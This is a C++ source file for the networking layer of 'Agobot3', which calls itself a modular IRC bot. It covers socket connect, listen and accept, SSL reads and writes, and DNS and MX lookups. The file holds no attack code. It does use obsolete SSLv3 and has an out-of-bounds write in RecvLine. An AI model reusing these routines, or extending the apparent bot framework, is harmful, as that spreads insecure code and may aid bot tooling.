/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"
#include "sdcompat.h"
#include "sockets.h"
#include "random.h"

#ifdef WIN32
int volatile g_iSockRefCount=0;
#endif // WIN32

bool volatile g_bSocketsRunning=true;
inline bool CanDoStuff() { return g_bSocketsRunning; }

#ifndef AGOBOT_NO_OPENSSL
class CSocketInit { public: CSocketInit() { SSL_library_init(); } };
CSocketInit g_cSocketInit;
#endif // AGOBOT_NO_OPENSSL

CSocket::CSocket(bool bPerm)
{
#ifdef WIN32
	if(!g_iSockRefCount)
	{	g_iSockRefCount++; WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &wsaData); }
	else g_iSockRefCount++;
#endif // WIN32
	m_sSocket=SOCKET_ERROR; m_bPerm=bPerm; m_bAsync=false;
	m_sPort=0; strcpy(m_szHost, ""); m_bConnected=false;
#ifndef AGOBOT_NO_OPENSSL
	m_psslCtx=NULL; m_pSSL=NULL; m_bUseSSL=false;
#endif // AGOBOT_NO_OPENSSL
}

CSocket::~CSocket()
{	if(!m_bPerm) Disconnect();
#ifdef WIN32
	if(g_iSockRefCount>1) g_iSockRefCount--;
	else if(g_iSockRefCount==1)
	{	g_iSockRefCount--; WSACleanup(); }
#endif // WIN32
}

bool CSocket::Connect(const char *szHost, int iPort, bool bAsync, bool bUseSSL)
{	if(!CanDoStuff()) return false; if(m_bConnected) return true;

	strncpy(m_szHost, szHost, sizeof(m_szHost)); m_sPort=iPort;
	CDNS cDNS; bool bRetVal=false;
	bRetVal=Connect(cDNS.ResolveAddress(szHost), iPort, bAsync, bUseSSL);
	return bRetVal; }

bool CSocket::Connect(const unsigned long lHost, int iPort, bool bAsync, bool bUseSSL)
{	if(!CanDoStuff()) return false; if(m_bConnected) return true;

#ifndef AGOBOT_NO_OPENSSL
	if(bUseSSL)
	{	if(m_psslCtx) { SSL_CTX_free(m_psslCtx); m_psslCtx=NULL; }
		if(m_pSSL) { SSL_shutdown(m_pSSL); SSL_free(m_pSSL); m_pSSL=NULL; }
		// Initialize the context, exit if fails
		m_psslCtx=SSL_CTX_new(SSLv3_method()); if(!m_psslCtx) return false;
		// Initialize the object, exit if fails
		m_pSSL=SSL_new(m_psslCtx); if(!m_pSSL) return false; }
	m_bUseSSL=bUseSSL;
#endif // AGOBOT_NO_OPENSSL

	m_sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sSocket==INVALID_SOCKET) { Disconnect(); return false; }
	if(!bUseSSL) SetAsync(true); else SetAsync(false);
//	if(!bUseSSL) SetAsync(bAsync); else SetAsync(false);
	sockaddr_in ssin; m_sPort=iPort;
	memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
	ssin.sin_port=htons(iPort); ssin.sin_addr.s_addr=lHost; m_sPort=iPort; 
	if(connect(m_sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in))<0)
	{	if(ERRNO!=EINPROGRESS && ERRNO!=EAGAIN && ERRNO!=EWOULDBLOCK) {
			m_bConnected=false; return false; }
		if(bAsync) {
			m_bConnected=true; return true; } }

	// Wait till socket is connected
	unsigned long lTimeOut=10;
	timeval thatv; memset(&thatv, 0, sizeof(timeval)); thatv.tv_sec=lTimeOut;
	fd_set wset; FD_ZERO(&wset); FD_SET(m_sSocket, &wset);
	
	while(select(m_sSocket+1, NULL, &wset, NULL, &thatv)<0) {
		int iErrno=ERRNO;
		if(ERRNO!=EINTR) {
			Disconnect(); m_bConnected=false; return false;
		}
		if(thatv.tv_sec==0 && thatv.tv_usec==0) {
			Disconnect(); m_bConnected=false; return false;
		}
	}

	if(!bUseSSL) SetAsync(bAsync); else SetAsync(false);
#ifndef AGOBOT_NO_OPENSSL
	if(bUseSSL) {
		if(!SSL_set_fd(m_pSSL, m_sSocket))
			return false;
		if(SSL_connect(m_pSSL)!=1)
			return false;
	}
#endif // AGOBOT_NO_OPENSSL

	m_bConnected=true; return true; }

void CSocket::Disconnect()
{	if(m_sSocket!=SOCKET_ERROR && m_sSocket!=INVALID_SOCKET)
#ifdef _WIN32
		closesocket(m_sSocket);
#else
		close(m_sSocket);
#endif // _WIN32
#ifndef AGOBOT_NO_OPENSSL
	if(m_bUseSSL && m_pSSL) SSL_shutdown(m_pSSL);
#endif // AGOBOT_NO_OPENSSL
	ClearSocket(); m_bConnected=false; }

void CSocket::ClearSocket() {
	m_sSocket=SOCKET_ERROR; m_sPort=0; strcpy(m_szHost, "");
	m_bConnected=false; m_bAsync=false;
#ifndef AGOBOT_NO_OPENSSL
	if(m_psslCtx) { SSL_CTX_free(m_psslCtx); m_psslCtx=NULL; }
	if(m_pSSL) { SSL_shutdown(m_pSSL); SSL_free(m_pSSL); m_pSSL=NULL; }
#endif // AGOBOT_NO_OPENSSL
}

bool CSocket::Bind(int iPort)
{	if(!CanDoStuff()) return false; if(m_bConnected) return true;

	m_sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sSocket==INVALID_SOCKET) { Disconnect(); return false; }
	sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
	ssin.sin_port=htons(iPort); ssin.sin_addr.s_addr=INADDR_ANY;
	if(bind(m_sSocket, (sockaddr*)&ssin, sizeof(ssin))!=0)
	{	Disconnect(); return false; }
	if(listen(m_sSocket, 50)==SOCKET_ERROR)
	{	Disconnect(); return false; }

	m_bConnected=true; return true; }

bool CSocket::Accept(CSocket &sSocket, sockaddr_in *cssin, bool bUseSSL)
{	if(!CanDoStuff()) return false; if(!m_bConnected) return false;
	bool bCanAccept=false;

#ifdef _WIN32
	if(!m_bAsync) {
		while(CanDoStuff())
		{	fd_set fdSet; FD_ZERO(&fdSet); FD_SET(m_sSocket, &fdSet);
			timeval tv; tv.tv_sec=0; tv.tv_usec=100;
			if(!select(m_sSocket+1, &fdSet, NULL, NULL, &tv)) continue;
			if(FD_ISSET(m_sSocket, &fdSet)) { bCanAccept=true; break; } }

		if(!bCanAccept) return false;
	}
#endif // _WIN32

	int sTemp=SOCKET_ERROR; if(cssin)
	{	socklen_t clen=sizeof(*cssin);
		sTemp=accept(m_sSocket, (sockaddr*)cssin, &clen);
	} else {
		sockaddr_in stcssin; socklen_t stclen=sizeof(stcssin);
		sTemp=accept(m_sSocket, (sockaddr*)&stcssin, &stclen);
	}

	if(sTemp==SOCKET_ERROR) return false;
	sSocket=sTemp; sSocket.m_bUseSSL=bUseSSL;

#ifndef AGOBOT_NO_OPENSSL
	if(bUseSSL)
	{	if(sSocket.m_psslCtx) { SSL_CTX_free(sSocket.m_psslCtx); sSocket.m_psslCtx=NULL; };
		if(sSocket.m_pSSL) { SSL_shutdown(sSocket.m_pSSL); SSL_free(sSocket.m_pSSL); sSocket.m_pSSL=NULL; }
		// Initialize the context, exit if fails
		sSocket.m_psslCtx=SSL_CTX_new(SSLv3_method()); if(!sSocket.m_psslCtx) return false;
		// Initialize the object, exit if fails
		sSocket.m_pSSL=SSL_new(sSocket.m_psslCtx); if(!sSocket.m_pSSL) return false;

		// Set the file descriptor for the new socket
		if(!SSL_set_fd(sSocket.m_pSSL, sTemp)) return false;
		// Accept the SSL connection
		if(SSL_accept(sSocket.m_pSSL)!=1) return false; }
#endif // AGOBOT_NO_OPENSSL

	return true; }

bool CSocket::Recv(char *szBuffer, int iBufSize, int *pBytesRead)
{	return RecvTO(szBuffer, iBufSize, 0, pBytesRead); }

bool CSocket::RecvTO(char *szBuffer, int iBufSize, unsigned long lTimeOut, int *pBytesRead)
{	if(m_sSocket==SOCKET_ERROR || !m_bConnected) return false;
	unsigned long lTimeStart=GetTickCount();

	if(!m_bUseSSL && lTimeOut) {
		while(CanDoStuff())
		{	fd_set fdSet; FD_ZERO(&fdSet); FD_SET(m_sSocket, &fdSet);
			fd_set fdErr; FD_ZERO(&fdErr); FD_SET(m_sSocket, &fdErr);
			timeval tv; tv.tv_sec=0; tv.tv_usec=100;
			if((GetTickCount()-lTimeStart) > lTimeOut) return false;
			if(!select(m_sSocket+1, &fdSet, NULL, &fdErr, &tv)) continue;
			if(FD_ISSET(m_sSocket, &fdErr)) return false;
			if(FD_ISSET(m_sSocket, &fdSet)) break; } }

	if(!CanDoStuff()) return false;

	int iBytesRead=0;
#ifndef AGOBOT_NO_OPENSSL
	if(m_bUseSSL)
	{	iBytesRead=SSL_read(m_pSSL, szBuffer, iBufSize);
	} else {
#endif // AGOBOT_NO_OPENSSL
#ifdef _WIN32
		iBytesRead=recv(m_sSocket, szBuffer, iBufSize, 0);
#else
		iBytesRead=recv(m_sSocket, szBuffer, iBufSize, 0);
#endif // _WIN32
#ifndef AGOBOT_NO_OPENSSL
	}
#endif // AGOBOT_NO_OPENSSL
	if(pBytesRead) *pBytesRead=iBytesRead;
	if(iBytesRead==SOCKET_ERROR || iBytesRead==0)
		if(ERRNO==EWOULDBLOCK) return true; else return false;
	return true; }

bool CSocket::Write(const char *szBuffer, int iBufSize, int *pBytesWritten)
{	if(m_sSocket==SOCKET_ERROR || !m_bConnected) return false;

	int iBytesWritten=0;
#ifndef AGOBOT_NO_OPENSSL
	if(m_bUseSSL)
	{	iBytesWritten=SSL_write(m_pSSL, szBuffer, iBufSize);
	} else {
#endif // AGOBOT_NO_OPENSSL
#ifdef _WIN32
		iBytesWritten=send(m_sSocket, szBuffer, iBufSize, 0);
#else
		iBytesWritten=send(m_sSocket, szBuffer, iBufSize, 0);
#endif // _WIN32
#ifndef AGOBOT_NO_OPENSSL
	}
#endif // AGOBOT_NO_OPENSSL
	if(pBytesWritten) *pBytesWritten=iBytesWritten;
	if(iBytesWritten==SOCKET_ERROR || iBytesWritten==0)
		if(ERRNO==EWOULDBLOCK) return true; else return false;
	return true; }

bool CSocket::RecvLine(char *szBuffer, int iBufSize)
{	if(!CanDoStuff()) return false; if(!m_bConnected) return false;

	int iBufIndex=0; szBuffer[iBufIndex]='\0'; bool bReceiving=true;
	while(iBufIndex<iBufSize-1 && &szBuffer[iBufIndex] && bReceiving && CanDoStuff())
	{	if(!Recv(&szBuffer[iBufIndex], 1)) return false;
		szBuffer[iBufIndex+1]='\0';
		if(szBuffer[iBufIndex]=='\n' || szBuffer[iBufIndex]=='\r' || !szBuffer[iBufIndex])
		{	szBuffer[iBufIndex-1]='\x00'; bReceiving=false; }
		iBufIndex++; }
	szBuffer[iBufSize-1]='\0'; return true;
	return true; }

bool CSocket::RecvLineIRC(char *szBuffer, int iBufSize)
{	if(!CanDoStuff()) return false; if(!m_bConnected) return false;

	int iBufIndex=0; szBuffer[iBufIndex]='\0'; bool bReceiving=true;
	while(iBufIndex<iBufSize-1 && &szBuffer[iBufIndex] && bReceiving && CanDoStuff())
	{	if(!Recv(&szBuffer[iBufIndex], 1)) return false;
		szBuffer[iBufIndex+1]='\0';
		if(szBuffer[iBufIndex]=='\n' || !szBuffer[iBufIndex])
		{	if(szBuffer[iBufIndex-1]=='\r')
				szBuffer[iBufIndex-1]='\x00';
			else
				szBuffer[iBufIndex]='\x00';
			bReceiving=false; }
		iBufIndex++; }
	szBuffer[iBufSize-1]='\0'; return true;
	return true; }

int CSocket::GetSockName(sockaddr *pSockAddr, socklen_t *pSockAddrLen)
{	if(!CanDoStuff()) return 0;

	if(m_sSocket==SOCKET_ERROR) return 0;
	return getsockname(m_sSocket, pSockAddr, pSockAddrLen); }

int CSocket::GetPeerName(sockaddr *pSockAddr, socklen_t *pSockAddrLen)
{	if(!CanDoStuff()) return 0;

	if(m_sSocket==SOCKET_ERROR) return 0;
	return getpeername(m_sSocket, pSockAddr, pSockAddrLen); }

bool CSocket::IsConnected() {
	if(!m_bAsync) return ((m_sSocket!=SOCKET_ERROR) && m_bConnected); else
	{	fd_set fdSet; FD_ZERO(&fdSet); FD_SET(m_sSocket, &fdSet);
		timeval tv; tv.tv_sec=0; tv.tv_usec=0;
		if(!select(m_sSocket+1, NULL, &fdSet, NULL, &tv)) return false;
		if(FD_ISSET(m_sSocket, &fdSet)) return true; }
	return false; }

bool CSocket::GotError() {
	if(!m_bAsync) return false; else
	{	fd_set fdSet; FD_ZERO(&fdSet); FD_SET(m_sSocket, &fdSet);
		timeval tv; tv.tv_sec=0; tv.tv_usec=0;
		if(!select(m_sSocket+1, NULL, NULL, &fdSet, &tv)) return false;
		if(FD_ISSET(m_sSocket, &fdSet)) return true; }
	return false; }

void CSocket::CloneToTemp(CSocket &sSocket)
{	// Clone connection data
	sSocket.m_sPort=m_sPort;
	strncpy(sSocket.m_szHost, m_szHost, sizeof(sSocket.m_szHost));

	// Non-connected and not asynchronous socket
	sSocket.m_sSocket=SOCKET_ERROR;
	sSocket.m_bAsync=false; sSocket.m_bConnected=false;

	sSocket.m_bUseSSL=m_bUseSSL;
}

void CSocket::SetAsync(bool bAsync)
{	m_bAsync=bAsync; if(m_bAsync)
	{	SET_SOCK_BLOCK(m_sSocket, 0); }
	else
	{	SET_SOCK_BLOCK(m_sSocket, 1); } }

CDNS::CDNS() { }
CDNS::~CDNS() { }

unsigned long CDNS::ResolveAddress(const char *szHost)
{	if(!CanDoStuff()) return 0;

	unsigned long lAddr=inet_addr(szHost);
	if(lAddr==INADDR_NONE) {
		hostent *pHE=gethostbyname(szHost);
		if(!pHE) return INADDR_NONE;
		int iCount=0; while(pHE->h_addr_list[iCount]) iCount++;
		init_random(); int iHost=brandom(0, iCount-1);
		lAddr=*((unsigned long*)pHE->h_addr_list[iHost]);
	}
	return lAddr; }

CString CDNS::ResolveMX(const char *szHost)
{	if(!CanDoStuff()) return CString(szHost);
	
	CString sHost(szHost);
	if(!sHost.CStr()) return CString("");
	if(!sHost.Compare("")) return CString("");

	CString sRetVal("");

#ifdef WIN32
	DNS_RECORD *pdnsRecords;

	// Query the nameserver for the MX
	DNS_STATUS dnsStatus=DnsQuery(sHost.CStr(), DNS_TYPE_MX,
		DNS_QUERY_STANDARD, NULL, &pdnsRecords, NULL);
	if(dnsStatus!=0) return sRetVal;

	// Check if multiple records got returned
	if(strcmp(pdnsRecords->pNext->pName, ".")) {
		// Multiple records, pick a random one to return
		DNS_RECORD *pdnsTemp=pdnsRecords;
		while(true) {
			// Select a random one
			if(((GetTickCount()%16)==8) && pdnsTemp->wType==DNS_TYPE_MX)
			{	sRetVal.Assign(pdnsTemp->Data.MX.pNameExchange);
				break; }
			// Loop till one is selected
			pdnsTemp=pdnsTemp->pNext; if(!pdnsTemp) pdnsTemp=pdnsRecords;
			if(!strcmp(pdnsTemp->pName, ".")) pdnsTemp=pdnsRecords;
		}
	} else {
		// Single record
		sRetVal.Assign(pdnsRecords->Data.MX.pNameExchange);
	}
#else
	// FIXME: Add ResolveMX for linux
#endif // WIN32

	// Fallback in case no MX was found
	if(!sRetVal.Compare("")) sRetVal.Assign(szHost);

	// Return result
	return sRetVal; }

CSocketServer::CSocketServer() { m_iListenPort=0; m_pfnAcceptHandler=NULL; }
CSocketServer::CSocketServer(int iListenPort, pfnAccept pfnAcceptHandler) {
	m_iListenPort=iListenPort; m_pfnAcceptHandler=pfnAcceptHandler; }

void *CSocketServer::Run() {
	if(!m_iListenPort || !m_pfnAcceptHandler) return NULL;
	CSocket *sClientSocket=NULL;

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CSocketServer(0x%8.8Xh): Binding %s to port %d.\n", this, m_sFriendlyName.CStr(), m_iListenPort);
#endif // DBGCONSOLE

	while(!m_sListenSocket.Bind(m_iListenPort) && m_bRunning && g_cMainCtrl.m_bRunning)
		Sleep(2000);

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CSocketServer(0x%8.8Xh): %s listening on port %d.\n", this, m_sFriendlyName.CStr(), m_iListenPort);
#endif // DBGCONSOLE

	while(m_bRunning && g_cMainCtrl.m_bRunning)
	{
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "CSocketServer(0x%8.8Xh): Creating new socket.\n", this);
#endif // DBGCONSOLE
		if(!sClientSocket) sClientSocket=new CSocket;
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "CSocketServer(0x%8.8Xh): Waiting for connection.\n", this);
#endif // DBGCONSOLE
		if(!m_sListenSocket.Accept(*sClientSocket)) {
			Sleep(2000); continue; }

		// Get the remote ip via getpeername
		sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); sClientSocket->GetPeerName(&sa, &sas);
		// Break if the ip is 0.0.0.0
		if(!(unsigned char)sa.sa_data[2]) continue;

#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "CSocketServer(0x%8.8Xh): %s connection from %d.%d.%d.%d accepted.\n", this, m_sFriendlyName.CStr(),
			(unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], (unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#endif // DBGCONSOLE

		m_pfnAcceptHandler(sClientSocket); }

	m_sListenSocket.Disconnect(); return NULL; }

